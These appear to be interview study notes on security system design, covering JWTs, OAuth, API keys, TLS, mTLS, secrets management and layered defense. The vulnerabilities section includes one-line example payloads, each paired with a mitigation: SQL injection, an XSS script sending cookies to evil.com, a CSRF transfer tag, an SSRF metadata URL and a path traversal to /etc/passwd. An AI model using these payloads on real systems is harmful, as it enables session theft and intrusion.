Security — System Design Notes

---
Authentication vs Authorization

Authentication (authn): verifying identity — who are you?
  - "Are you really alice@example.com?" — proven by password, token, certificate, biometric
  - Happens first; everything else depends on it

Authorization (authz): verifying permission — what are you allowed to do?
  - "Can alice read /admin?" — checked after identity is confirmed
  - Mechanisms: RBAC (role-based), ABAC (attribute-based), ACLs

Common confusion: a valid JWT proves identity (authn), but you still need authz checks to decide
what that identity can access. Conflating the two is a design mistake.

---
JWT — JSON Web Tokens

Structure: header.payload.signature (three base64url-encoded segments, dot-separated)
  header:    {"alg":"HS256","typ":"JWT"}  — signing algorithm
  payload:   {"sub":"user:42","exp":1700000000,"role":"admin"}  — claims (not encrypted, just encoded)
  signature: HMAC-SHA256(base64(header) + "." + base64(payload), secret)

Stateless verification:
  Server validates signature using the secret/public key — no DB lookup required
  → horizontal scaling: any server can verify any token independently
  Tradeoff: cannot invalidate a token before expiry (no revocation without a blocklist)

Expiry:
  exp claim enforced by the verifying server
  Short-lived access tokens (15 min) + long-lived refresh tokens (7-30 days)
  If access token is stolen, damage window = remaining TTL

Refresh token flow:
  1. User logs in → server issues access_token (short TTL) + refresh_token (long TTL)
  2. Client uses access_token on every request
  3. access_token expires → client sends refresh_token to /auth/refresh
  4. Server validates refresh_token (checks DB/store) → issues new access_token
  5. If refresh_token is compromised, revoke it in the store (this is the one DB-backed check)

Where to store:
  httpOnly cookie:  JS cannot read it → XSS-safe; browser auto-sends → CSRF risk; mitigate with SameSite=Strict
  localStorage:     JS can read it → XSS risk (malicious script exfiltrates token); avoid for sensitive apps
  sessionStorage:   cleared on tab close; same XSS risk as localStorage
  Recommendation: httpOnly + SameSite=Strict cookie for web; in-memory for SPAs (lost on refresh)

---
OAuth 2.0

What it solves: delegated authorization — let a third party act on your behalf without sharing your password
  Example: "Let this app read your Google contacts" without giving it your Google password

Authorization code flow (most secure, for server-side/SPA apps):
  1. User clicks "Login with Google" → app redirects to Google with client_id, redirect_uri, scope, state
  2. User logs in at Google and consents
  3. Google redirects back to redirect_uri with a short-lived authorization code
  4. App backend exchanges code for tokens: POST /token with code + client_secret
  5. Google returns access_token (short TTL) + refresh_token
  6. App uses access_token to call Google APIs on user's behalf

Why the code exchange step (step 4)?
  → authorization code is transmitted via browser redirect (URL) — visible in logs, referrer headers
  → exchanging it server-side with client_secret never exposes the actual token to the browser

Access token vs refresh token:
  access_token:  short-lived (minutes to hours), sent with every API request, stateless
  refresh_token: long-lived (days to months), stored securely, only sent to auth server to get new access token

When to use OAuth vs plain JWT auth:
  OAuth: when you need delegated access to a third-party resource (social login, API integrations)
  Plain JWT: when you control both the client and server (internal auth system, microservices)

---
API Keys

What they are: opaque secrets (random 32+ byte strings) issued to API consumers
  No expiry by default; revoked explicitly; scoped to a client/application not a user

API key vs JWT:
  API key:  server must look it up in DB to validate (stateful), simple, no claims embedded
  JWT:      stateless validation (verify signature), carries claims, short-lived

When to use API keys:
  - Machine-to-machine access (no human user session)
  - External developer/partner integrations
  - Simple, long-lived service accounts
  - When you need easy revocation (just delete the record)

Key rotation:
  Issue new key with overlap period → client migrates to new key → revoke old key
  Automated rotation (e.g. AWS Secrets Manager auto-rotate) preferred over manual

Rate limiting by key:
  Track request count per key in Redis with INCR + expiry
  Bucket per time window: key:abc123:2024-03-10:14 → current hour request count
  Allows per-client throttling independent of IP (which can be shared via NAT)

---
HTTPS Termination

TLS handshake (TLS 1.3 simplified):
  1. Client Hello: supported cipher suites, TLS version, random nonce
  2. Server Hello: chosen cipher suite, server certificate, server random
  3. Client verifies certificate (CA chain, hostname match, not expired)
  4. Key exchange: client + server derive shared session keys from Diffie-Hellman
  5. Both sides confirm with Finished messages; encrypted tunnel established
  Round trips: TLS 1.3 = 1 RTT (vs TLS 1.2 = 2 RTT)

Where termination happens:

  At load balancer (most common):
    + Offloads CPU-intensive TLS crypto from app servers
    + Centralized certificate management (one place to rotate certs)
    + Internal traffic (LB → app) is plaintext or can use separate internal TLS
    - If internal network is untrusted, plaintext between LB and app is a risk

  At origin (end-to-end TLS):
    + Traffic is encrypted all the way to the app server
    - Every app server needs a certificate; cert management complexity scales with fleet size
    - LB cannot inspect traffic for routing decisions (e.g. path-based routing, WAF)

Certificate management:
  Let's Encrypt: free, 90-day certificates, auto-renewed via ACME protocol
  AWS ACM / GCP Certificate Manager: managed certs, auto-renewed, free for use with their LBs
  Wildcard certs: *.example.com covers all subdomains with one cert

---
mTLS — Mutual TLS

Standard TLS: only the client verifies the server's certificate
mTLS: both sides present and verify certificates → bidirectional authentication

How it works:
  1. Server presents its certificate (as in standard TLS)
  2. Server requests client certificate
  3. Client presents its certificate
  4. Both sides verify the other's cert against a trusted CA
  → result: cryptographic proof of identity for both parties

When to use:
  - Service-to-service communication inside a cluster (zero-trust networking)
  - Replacing API keys for internal microservice auth
  - Enforced by service meshes: Istio, Linkerd auto-issue certs and enforce mTLS transparently

Trade-offs:
  + Stronger than API keys (private key never leaves the service; cert can be rotated automatically)
  + Prevents rogue internal services from calling production services
  - Certificate lifecycle management complexity (issuance, rotation, revocation)
  - Adds latency to every new connection (certificate exchange + verification)
  - Debugging is harder (can't inspect traffic with standard tools without cert)

---
Common Vulnerabilities

SQL Injection:
  What: attacker injects SQL into user input → query executes attacker's logic
  Example: SELECT * FROM users WHERE id = '' OR '1'='1' -- '
  Mitigation: parameterized queries / prepared statements — never string-concatenate user input into SQL

XSS — Cross-Site Scripting:
  What: attacker injects malicious JS into a page served to other users → runs in victim's browser
  Example: <script>document.location='evil.com?c='+document.cookie</script> stored in a comment field
  Mitigation: output encoding (escape < > & " in HTML), Content-Security-Policy header, httpOnly cookies

CSRF — Cross-Site Request Forgery:
  What: malicious site tricks user's browser into making authenticated requests to your site
  Example: <img src="https://bank.com/transfer?to=attacker&amount=1000"> loaded on evil.com
  Mitigation: SameSite=Strict/Lax cookie attribute, CSRF token in form (double-submit pattern)

SSRF — Server-Side Request Forgery:
  What: attacker tricks server into making HTTP requests to internal resources
  Example: fetch URL parameter set to http://169.254.169.254/latest/meta-data/ (AWS metadata)
  Mitigation: allowlist outbound URLs/IP ranges, block private IP ranges (10.x, 172.16.x, 169.254.x)

Path Traversal:
  What: attacker uses ../ sequences to access files outside the intended directory
  Example: /files?name=../../etc/passwd
  Mitigation: canonicalize paths, validate against allowed base directory (never use raw user input in file paths)

---
Secrets Management

Environment variables:
  + Simple; not committed to source code if set at deploy time
  - Visible to any code in the process; logged accidentally in crash dumps or debug output
  - No audit trail, rotation, or access control

Secret managers (Vault, AWS Secrets Manager, GCP Secret Manager):
  + Centralized storage with encryption at rest
  + Fine-grained access control (IAM policies per secret)
  + Audit logs (who accessed what, when)
  + Automatic rotation (database passwords, API keys)
  + Dynamic secrets: Vault generates short-lived credentials on demand (no static secret at all)
  - Added operational dependency; must handle secret manager unavailability

Rule: never put secrets in code, config files committed to git, or Docker images
Rotation: assume secrets leak eventually — design for rotation without downtime (overlap period)

---
Defense in Depth

Principle: no single security control should be the only line of defense
  If one layer fails, the next layer limits the damage

Layers in a typical web system:
  Network layer:    firewall rules, VPC private subnets, security groups (restrict inbound/outbound)
  Edge layer:       WAF (web application firewall) — blocks SQLi, XSS, known attack patterns
  Transport layer:  HTTPS everywhere, HSTS header, mTLS for internal services
  Application layer: input validation, parameterized queries, output encoding, authz checks
  Data layer:       encryption at rest, column-level encryption for PII, minimal DB permissions
  Secrets layer:    secret manager, no hardcoded credentials, rotation
  Monitoring layer: anomaly detection, rate limiting, alerts on unusual access patterns

Why it matters in interviews:
  Interviewers don't expect a single perfect control — they want to see you think in layers
  "What if an attacker gets past the WAF?" → "The app still validates input and uses parameterized queries"
